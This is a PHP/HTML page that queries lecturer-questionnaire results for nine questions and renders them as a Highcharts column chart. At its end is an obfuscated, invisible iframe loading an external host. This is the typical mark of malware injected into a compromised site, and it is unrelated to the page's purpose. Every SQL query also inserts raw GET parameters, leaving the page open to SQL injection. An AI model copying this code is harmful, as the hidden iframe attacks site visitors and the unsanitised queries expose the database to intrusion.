<!DOCTYPE html>
<html>
<head>
<title>GRAFIK HASIL KUISIONER DOSEN</title>
<script type="text/javascript" src="jquery-1.11.3.min.js"></script>
<script type="text/javascript" src="highcharts.js"></script>
<script type="text/javascript" src="exporting.js"></script>
<style type="text/css">
.container { margin: auto; padding: 5px; width: 800px; border: 2px solid #DBDBDB; }
</style>
</head>

<?php 
    //Include Koneksi
    include "../../koneksi.php";


    //Membuat Query
    $q=mysql_query("SELECT  count(if (jawab = 1, thkusionerdos.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionerdos.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionerdos.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionerdos.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionerdos.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionerdos left join tkuisioner on thkusionerdos.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'dosen' and thkusionerdos.nik = '$_GET[nik]' and thkusionerdos.id_kelas = '$_GET[id_kelas]' and thkusionerdos.tahun_ajaran = '$_GET[tahun_ajaran]' and thkusionerdos.id_kuisioner = 'dosen/1' ");
    $r = mysql_fetch_array($q);

    $jum1a = $r['jum1'];
    $jum2a = $r['jum2'];
    $jum3a = $r['jum3'];
    $jum4a = $r['jum4'];
    $jum5a = $r['jum5'];

    $q1=mysql_query("SELECT  count(if (jawab = 1, thkusionerdos.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionerdos.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionerdos.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionerdos.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionerdos.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionerdos left join tkuisioner on thkusionerdos.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'dosen' and thkusionerdos.nik = '$_GET[nik]' and thkusionerdos.id_kelas = '$_GET[id_kelas]' and thkusionerdos.tahun_ajaran = '$_GET[tahun_ajaran]' and thkusionerdos.id_kuisioner = 'dosen/2'");
    $r1 = mysql_fetch_array($q1);

    $jum1b = $r1['jum1'];
    $jum2b = $r1['jum2'];
    $jum3b = $r1['jum3'];
    $jum4b = $r1['jum4'];
    $jum5b = $r1['jum5'];

    $q2=mysql_query("SELECT  count(if (jawab = 1, thkusionerdos.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionerdos.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionerdos.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionerdos.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionerdos.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionerdos left join tkuisioner on thkusionerdos.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'dosen' and thkusionerdos.nik = '$_GET[nik]' and thkusionerdos.id_kelas = '$_GET[id_kelas]' and thkusionerdos.tahun_ajaran = '$_GET[tahun_ajaran]' and thkusionerdos.id_kuisioner = 'dosen/3'");
    $r2 = mysql_fetch_array($q2);

    $jum1c = $r2['jum1'];
    $jum2c = $r2['jum2'];
    $jum3c = $r2['jum3'];
    $jum4c = $r2['jum4'];
    $jum5c = $r2['jum5'];

    $q3=mysql_query("SELECT  count(if (jawab = 1, thkusionerdos.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionerdos.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionerdos.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionerdos.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionerdos.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionerdos left join tkuisioner on thkusionerdos.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'dosen' and thkusionerdos.nik = '$_GET[nik]' and thkusionerdos.id_kelas = '$_GET[id_kelas]' and thkusionerdos.tahun_ajaran = '$_GET[tahun_ajaran]' and thkusionerdos.id_kuisioner = 'dosen/4'");
    $r3 = mysql_fetch_array($q3);

    $jum1d = $r3['jum1'];
    $jum2d = $r3['jum2'];
    $jum3d = $r3['jum3'];
    $jum4d = $r3['jum4'];
    $jum5d = $r3['jum5'];

    $q4=mysql_query("SELECT  count(if (jawab = 1, thkusionerdos.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionerdos.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionerdos.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionerdos.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionerdos.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionerdos left join tkuisioner on thkusionerdos.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'dosen' and thkusionerdos.nik = '$_GET[nik]' and thkusionerdos.id_kelas = '$_GET[id_kelas]' and thkusionerdos.tahun_ajaran = '$_GET[tahun_ajaran]' and thkusionerdos.id_kuisioner = 'dosen/5' ");
    $r4 = mysql_fetch_array($q4);

    $jum1e = $r4['jum1'];
    $jum2e = $r4['jum2'];
    $jum3e = $r4['jum3'];
    $jum4e = $r4['jum4'];
    $jum5e = $r4['jum5'];

    $q5=mysql_query("SELECT  count(if (jawab = 1, thkusionerdos.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionerdos.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionerdos.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionerdos.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionerdos.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionerdos left join tkuisioner on thkusionerdos.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'dosen' and thkusionerdos.nik = '$_GET[nik]' and thkusionerdos.id_kelas = '$_GET[id_kelas]' and thkusionerdos.tahun_ajaran = '$_GET[tahun_ajaran]' and thkusionerdos.id_kuisioner = 'dosen/6' ");
    $r5 = mysql_fetch_array($q5);

    $jum1f = $r5['jum1'];
    $jum2f = $r5['jum2'];
    $jum3f = $r5['jum3'];
    $jum4f = $r5['jum4'];
    $jum5f = $r5['jum5'];

    $q6=mysql_query("SELECT  count(if (jawab = 1, thkusionerdos.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionerdos.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionerdos.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionerdos.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionerdos.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionerdos left join tkuisioner on thkusionerdos.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'dosen' and thkusionerdos.nik = '$_GET[nik]' and thkusionerdos.id_kelas = '$_GET[id_kelas]' and thkusionerdos.tahun_ajaran = '$_GET[tahun_ajaran]' and thkusionerdos.id_kuisioner = 'dosen/7' ");
    $r6 = mysql_fetch_array($q6);

    $jum1g = $r6['jum1'];
    $jum2g = $r6['jum2'];
    $jum3g = $r6['jum3'];
    $jum4g = $r6['jum4'];
    $jum5g = $r6['jum5'];

    $q7=mysql_query("SELECT  count(if (jawab = 1, thkusionerdos.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionerdos.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionerdos.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionerdos.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionerdos.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionerdos left join tkuisioner on thkusionerdos.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'dosen' and thkusionerdos.nik = '$_GET[nik]' and thkusionerdos.id_kelas = '$_GET[id_kelas]' and thkusionerdos.tahun_ajaran = '$_GET[tahun_ajaran]' and thkusionerdos.id_kuisioner = 'dosen/8' ");
    $r7 = mysql_fetch_array($q7);

    $jum1h = $r7['jum1'];
    $jum2h = $r7['jum2'];
    $jum3h = $r7['jum3'];
    $jum4h = $r7['jum4'];
    $jum5h = $r7['jum5'];

    $q8=mysql_query("SELECT  count(if (jawab = 1, thkusionerdos.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionerdos.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionerdos.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionerdos.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionerdos.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionerdos left join tkuisioner on thkusionerdos.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'dosen' and thkusionerdos.nik = '$_GET[nik]' and thkusionerdos.id_kelas = '$_GET[id_kelas]' and thkusionerdos.tahun_ajaran = '$_GET[tahun_ajaran]' and thkusionerdos.id_kuisioner = 'dosen/9' ");
    $r8 = mysql_fetch_array($q8);

    $jum1i = $r8['jum1'];
    $jum2i = $r8['jum2'];
    $jum3i = $r8['jum3'];
    $jum4i = $r8['jum4'];
    $jum5i = $r8['jum5'];

?>
<body>
<div class="container">
<div class="grafik" style="width:100%; height:400px;"></div>
</div>
<script type="text/javascript">
$('.grafik').highcharts({
 chart: {
  type: 'column',
  marginTop: 80
 },
 credits: {
  enabled: false
 }, 
 tooltip: {
  shared: true,
  crosshairs: true,
  headerFormat: '<b>{point.key}</b>< br />'
 },
 title: {
  text: 'HASIL KUISIONER'
 },
 subtitle: {
  text: 'TAHUN 2016/2017'
 },
 xAxis: {
  categories: [
  1,2,3,4,5,6,7,8,9
  ],

  labels: {
   rotation: 0,
   align: 'right',
   style: {
    fontSize: '10px',
    fontFamily: 'Verdana, sans-serif'
   }
  }
 },
 legend: {
  enabled: true
 },
 series: [ 
          {
            "name" : "1 KURANG SEKALI",
            "data" : [<?php echo $jum1a; ?>,<?php echo $jum1b; ?>,<?php echo $jum1c; ?>,<?php echo $jum1d; ?>,<?php echo $jum1e; ?>,<?php echo $jum1f; ?>,<?php echo $jum1g; ?>,<?php echo $jum1h; ?>,<?php echo $jum1i; ?>] },
            {
            "name" : "2 KURANG",
            "data" : [<?php echo $jum2a; ?>,<?php echo $jum2b; ?>,<?php echo $jum2c; ?>,<?php echo $jum2d; ?>,<?php echo $jum2e; ?>,<?php echo $jum2f; ?>,<?php echo $jum2g; ?>,<?php echo $jum2h; ?>,<?php echo $jum2i; ?>] },
            {
            "name" : "3 CUKUP",
            "data" : [<?php echo $jum3a; ?>,<?php echo $jum3b; ?>,<?php echo $jum3c; ?>,<?php echo $jum3d; ?>,<?php echo $jum3e; ?>,<?php echo $jum3f; ?>,<?php echo $jum3g; ?>,<?php echo $jum3h; ?>,<?php echo $jum3i; ?>] },
            {
            "name" : "4 BAIK",
            "data" : [<?php echo $jum4a; ?>,<?php echo $jum4b; ?>,<?php echo $jum4c; ?>,<?php echo $jum4d; ?>,<?php echo $jum4e; ?>,<?php echo $jum4f; ?>,<?php echo $jum4g; ?>,<?php echo $jum4h; ?>,<?php echo $jum4i; ?>] },
            {
            "name" : "5 SANGAT BAIK",
            "data" : [<?php echo $jum5a; ?>,<?php echo $jum5b; ?>,<?php echo $jum5c; ?>,<?php echo $jum5d; ?>,<?php echo $jum5e; ?>,<?php echo $jum5f; ?>,<?php echo $jum5g; ?>,<?php echo $jum5h; ?>,<?php echo $jum5i; ?>] },
    
        ]
});
</script>
<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>
